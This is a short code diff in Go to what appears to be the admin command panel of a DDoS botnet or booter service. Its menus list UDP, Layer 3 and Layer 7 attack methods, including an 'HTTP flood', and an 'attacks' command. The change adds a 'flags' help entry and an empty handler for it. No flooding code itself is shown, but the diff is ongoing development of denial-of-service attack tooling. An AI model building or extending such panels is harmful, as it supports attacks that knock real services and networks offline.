@@ -478,6 +478,7 @@ func Admin(conn net.Conn) {
 				{"methods_udp", ansiCommands + "View all UDP methods available" + ansiReset},
 				{"methods_l3", ansiCommands + "View all Layer 3 methods available" + ansiReset},
 				{"methods_l7", ansiCommands + "View all Layer 7 methods available" + ansiReset},
+				{"flags", ansiCommands + "Method Flags Usage" + ansiReset},
 				{"clear", ansiCommands + "Clears your terminal and history" + ansiReset},
 			}
 			writeGradientTable(session.Conn, []string{"Command", "Description"}, rows)
@@ -554,6 +555,8 @@ func Admin(conn net.Conn) {
 				{".http", ansiCommands + "HTTP flood (Layer 7)" + ansiReset},
 			}
 			writeGradientTable(session.Conn, []string{"Layer 7 Methods", "Description"}, rows)
+
+		case "flags":
 
 		case "attacks":
 			args := strings.Split(strings.ToLower(command), " ")[1:]
